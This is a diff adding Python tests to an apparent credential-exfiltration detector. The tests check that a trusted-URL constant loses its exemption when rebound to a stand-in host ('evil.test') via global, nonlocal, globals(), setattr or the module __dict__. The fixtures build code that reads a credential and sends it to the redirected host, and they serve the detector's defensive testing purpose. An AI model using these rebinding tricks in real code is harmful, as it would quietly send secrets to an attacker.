@@ -308,3 +308,147 @@ def test_long_prose_constant_with_only_a_bare_credential_word_stays_unconvicted(
 def test_long_prose_constant_with_slashed_credential_words_stays_unconvicted():
     prose = "Never log " + "the token/secret/key/password/pin/api values or /secrets data " * 3
     assert _flow_rules(_const_read_and_send(prose)) == []
+
+
+# ---- B-1086 ------------------------------------------------------------------------------------
+# The B-1084 filter only walks the scopes between the use and the constant's owner. A constant can
+# also be rebound from a scope that is NOT on that chain; each shape below must lose the exemption.
+
+_CALL_ONLY = "def call():\n" + _READ + _SEND
+
+
+def test_sibling_function_global_write_of_the_constant_does_not_borrow_the_exemption():
+    src = (
+        _API_HEAD
+        + "def repoint():\n"
+        + "    global API\n"
+        + '    API = os.environ["T"]\n'
+        + _CALL_ONLY
+        + "repoint()\ncall()\n"
+    )
+    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+def test_sibling_function_global_augmented_write_does_not_borrow_the_exemption():
+    src = (
+        _API_HEAD
+        + "def repoint():\n"
+        + "    global API\n"
+        + '    API += "@evil.test"\n'
+        + _CALL_ONLY
+    )
+    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+def test_nested_function_nonlocal_write_of_the_constant_does_not_borrow_the_exemption():
+    src = (
+        "import requests, os\n"
+        "def outer():\n"
+        '    API = "https://kubernetes.default.svc"\n'
+        "    def repoint():\n"
+        "        nonlocal API\n"
+        '        API = os.environ["T"]\n'
+        "    def call():\n"
+        "    " + _READ
+        + "    " + _SEND
+        + "    repoint()\n"
+        "    call()\n"
+    )
+    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+def test_globals_subscript_write_does_not_borrow_the_exemption():
+    src = (
+        _API_HEAD
+        + "def repoint():\n"
+        + '    globals()["API"] = "https://evil.test/x"\n'
+        + _CALL_ONLY
+    )
+    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+def test_setattr_on_this_module_does_not_borrow_the_exemption():
+    src = (
+        "import requests, os, sys\n"
+        'API = "https://kubernetes.default.svc"\n'
+        "def repoint():\n"
+        '    setattr(sys.modules[__name__], "API", "https://evil.test/x")\n'
+        + _CALL_ONLY
+    )
+    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+def test_module_dict_write_does_not_borrow_the_exemption():
+    src = (
+        "import requests, os, sys\n"
+        'API = "https://kubernetes.default.svc"\n'
+        "def repoint():\n"
+        '    sys.modules[__name__].__dict__["API"] = "https://evil.test/x"\n'
+        + _CALL_ONLY
+    )
+    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+def test_globals_update_does_not_borrow_the_exemption():
+    src = (
+        _API_HEAD
+        + "def repoint():\n"
+        + '    globals().update(API="https://evil.test/x")\n'
+        + _CALL_ONLY
+    )
+    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+def test_aliased_globals_write_does_not_borrow_the_exemption():
+    src = (
+        _API_HEAD
+        + "def repoint():\n"
+        + "    g = globals()\n"
+        + '    g["API"] = "https://evil.test/x"\n'
+        + _CALL_ONLY
+    )
+    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+def test_unrelated_global_declaration_keeps_the_exemption():
+    src = (
+        _API_HEAD
+        + "COUNT = 0\n"
+        + "def bump():\n"
+        + "    global COUNT\n"
+        + "    COUNT += 1\n"
+        + _CALL_ONLY
+    )
+    assert _flow_rules(src) == []
+
+
+def test_global_read_only_declaration_keeps_the_exemption():
+    src = (
+        _API_HEAD
+        + "def peek():\n"
+        + "    global API\n"
+        + "    return API\n"
+        + _CALL_ONLY
+    )
+    assert _flow_rules(src) == []
+
+
+def test_read_only_globals_lookup_keeps_the_exemption():
+    src = (
+        _API_HEAD
+        + "def peek():\n"
+        + '    return globals().get("API")\n'
+        + _CALL_ONLY
+    )
+    assert _flow_rules(src) == []
+
+
+def test_plain_unshadowed_constant_with_unrelated_setattr_keeps_the_exemption():
+    src = (
+        _API_HEAD
+        + "class C:\n"
+        + "    def __init__(self, v):\n"
+        + '        setattr(self, "v", v)\n'
+        + _CALL_ONLY
+    )
+    assert _flow_rules(src) == []
